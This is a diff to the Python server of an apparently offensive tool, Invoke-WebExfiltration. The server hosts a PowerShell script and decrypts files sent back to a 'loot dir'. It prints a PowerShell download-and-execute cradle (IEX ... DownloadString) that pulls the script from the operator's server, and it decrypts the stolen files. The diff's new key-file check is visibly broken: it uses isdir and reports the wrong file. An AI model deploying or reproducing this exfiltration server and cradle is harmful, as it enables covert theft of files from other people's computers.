@@ -24,11 +24,16 @@ DEFAULT_CERT_TMP_DIR = f'{os.getcwd()}/tmp_certificate'
 DEFAULT_CERTIFICATE_CRT = f'{DEFAULT_CERT_TMP_DIR}/cert.crt'
 DEFAULT_CERTIFICATE_KEY = f'{DEFAULT_CERT_TMP_DIR}/cert.key'
 
+
 def signal_handler(sig, frame):
+    """
+    Signal handler for program termination
+    """
     print('\n\nCtrl+C detected, exiting...')
     if os.path.isdir(DEFAULT_CERT_TMP_DIR):
         print("Cleaning up temp certificates...")
         shutil.rmtree(DEFAULT_CERT_TMP_DIR)
+    print("Exit")
     sys.exit(0)
 
 
@@ -88,6 +93,9 @@ def parse_args():
 
 
 def validate_args(parser):
+    """
+    Checking for valid arguments
+    """
     args = parser.parse_args()
 
     if not args.password:
@@ -98,6 +106,8 @@ def validate_args(parser):
 
     if not args.address:
         args.address = socket.gethostbyname(socket.gethostname())
+        if '127.' in args.address:
+            print("Error: Could not get interface IP address. Specify domain or IP manually with '--address'")
 
     if not args.targetdir:
         args.targetdir = DEFAULT_TARGETDIR
@@ -106,6 +116,15 @@ def validate_args(parser):
     if (not args.crt and args.key) or (args.crt and not args.key):
         print("Error: You need to specify both, '--crt' and '--key'")
         exit(1)
+    elif args.crt and args.key:
+        if not os.path.isfile(args.crt):
+            print(f"Error: '{args.crt} does not exist'")
+            exit(1)
+
+        if not os.path.isdir(args.key):
+            print(f"Error: '{args.crt} does not exist'")
+            exit(1)
+
     return args
 
 
@@ -116,8 +135,8 @@ class CouldNotDecryptError(Exception):
 class IWE:
     def __init__(self, password: str):
         """
-
-        :param password:
+        Init function for IWE
+        :param password: password used for file decryption
         """
 
         self.__password = password
@@ -126,23 +145,25 @@ class IWE:
         iwe_filename = 'Invoke-WebExfiltration.ps1'
 
         # Invoke-WebExfiltration need to be in the current working dir
-        # This messy command makes sure to always load IWE.ps1 from the directory where
+        # This messy command makes sure to always load Invoke-WebExfiltration.ps1 from the directory where
         # the iwe-server.py is located in. This is independent to the current PWD
         __location__ = os.path.realpath(os.path.join(os.getcwd(), os.path.dirname(__file__)))
         try:
             with open(os.path.join(__location__, iwe_filename)) as f:
                 self.powershell_iwe_script = f.read()
         except FileNotFoundError as e:
-            print(f"[X] Error: Could not open '{iwe_filename}'. File not found")
+            print(f"Error: Could not open '{iwe_filename}'. File not found")
+            exit(1)
 
     def __aes256_decrypt_bytes(self, aes256_cipher_bytes: bytes) -> bytes:
         """
+        Decryption function. Will decrypt cipher byte object with password class variable
 
         The first 16 bytes of the AES hex is the AES IV.
         The password is SHA256 hashed to get a 32 byte long password
 
-        :param aes256_cipher_bytes:
-        :return:
+        :param aes256_cipher_bytes: the encrypted bytes
+        :return: returns the decrypted bytes
         """
         # extract the AES IV from the cipher text
         aes_iv = aes256_cipher_bytes[:16]
@@ -194,6 +215,7 @@ class IWE:
 
 def cert_gen():
     """
+    Generates a self singed x509 certificate for HTTPS
     openssl req -newkey rsa:4096 -x509 -sha256 -days 3650 -nodes  -out certificate.crt -keyout certificate.key
     :return:
     """
@@ -250,8 +272,10 @@ def main():
     proto = "https" if not args.http else 'http'
     target_url = f'{proto}://{args.address}:{args.port}/'
 
+
     print(f"URL:      {target_url}\n" 
-          f"Password: {args.password}\n")
+          f"Password: {args.password}\n"
+          f"Loot dir: {args.targetdir}")
     print(f"Copy this into your PowerShell:\n"
           f"PS > IEX (New-Object Net.WebClient).DownloadString('{target_url}iwe')\n")
     print("Start exfiltrating files with:\n"
@@ -302,16 +326,16 @@ def main():
     def get_iwe_ps1():
         """
         Reads the current Invoke-WebExfiltration.ps1 file and returns it on request
-        :return:
         """
 
-        with open('Invoke-WebExfiltration.ps1') as f:
+        with open('Invoke-WebExfiltration.ps1', encoding="utf-8") as f:
             iwe_file = f.read()
 
         iwe_file = iwe_file.replace('TARGET_PLACEHOLDER', target_url)
 
         return Response(iwe_file, status=200)
 
+    # Run iwe in HTTP if needed
     if args.http:
         app.run(host='0.0.0.0', port=args.port)
     else:
